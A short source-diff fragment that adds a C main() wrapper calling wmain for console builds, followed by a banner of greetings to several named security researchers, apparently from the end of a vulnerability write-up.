+// Entry point for different build configurations
+#ifdef _CONSOLE
+int main() {
+    return wmain(__argc, __wargv);
+}
+#endif
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
